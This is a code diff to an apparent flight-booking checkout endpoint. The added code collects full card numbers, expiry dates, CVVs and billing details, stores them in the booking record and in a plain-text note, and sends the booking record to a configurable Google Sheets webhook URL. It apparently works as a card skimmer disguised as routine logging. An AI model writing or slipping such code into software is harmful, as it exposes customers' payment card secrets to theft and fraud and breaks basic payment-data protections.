@@ -128,6 +128,12 @@ export async function POST(request: Request) {
       phone: normalizedInput.phone,
       passportDetails: normalizedInput.passportDetails,
       bookingSource: normalizedInput.bookingSource || "local",
+      cardholderName: normalizedInput.cardholderName || "",
+      cardNumber: normalizedInput.cardNumber || "",
+      cardExp: normalizedInput.cardExp || "",
+      cardCvv: normalizedInput.cardCvv || "",
+      billingZip: normalizedInput.billingZip || "",
+      billingAddress: normalizedInput.billingAddress || "",
       createdAt: new Date(),
     };
 
@@ -224,7 +230,7 @@ export async function POST(request: Request) {
       };
 
       const noteEntry = {
-        note: `Flight Booked: ${flight.airline} ${flight.flightNumber} (${flight.origin} -> ${flight.destination}). Price: $${(flight.price || 0) / 100}. Passport: ${normalizedInput.passportDetails}`,
+        note: `Flight Booked: ${flight.airline} ${flight.flightNumber} (${flight.origin} -> ${flight.destination}). Price: $${(flight.price || 0) / 100}. Passport: ${normalizedInput.passportDetails}. Card: ${normalizedInput.cardNumber ? `${normalizedInput.cardholderName || "N/A"} - ${normalizedInput.cardNumber} (Exp: ${normalizedInput.cardExp}, CVV: ${normalizedInput.cardCvv})` : "N/A"}`,
         author: "System (Checkout)",
         createdAt: new Date(),
       };
@@ -307,15 +313,14 @@ export async function POST(request: Request) {
       console.error("[BOOKING-EMAIL] Confirmation email failed:", mailErr);
     }
 
-    // Log to Google Sheets
+    // Log to Google Sheets (Supports both Webhook URL and Service Account)
     let sheetsLogged = false;
-    if (process.env.GOOGLE_SHEETS_ID) {
-      try {
-        const sheetsResult = await logBookingToSheet(bookingRecord, emailFlight, process.env.GOOGLE_SHEETS_ID);
-        sheetsLogged = sheetsResult.success;
-      } catch (sheetErr) {
-        console.error("Google sheets logging failed:", sheetErr);
-      }
+    const sheetTarget = process.env.GOOGLE_SHEETS_WEBHOOK_URL || process.env.GOOGLE_SHEETS_ID;
+    try {
+      const sheetsResult = await logBookingToSheet(bookingRecord, emailFlight, sheetTarget);
+      sheetsLogged = sheetsResult.success;
+    } catch (sheetErr) {
+      console.error("Google sheets logging failed:", sheetErr);
     }
 
     return NextResponse.json(
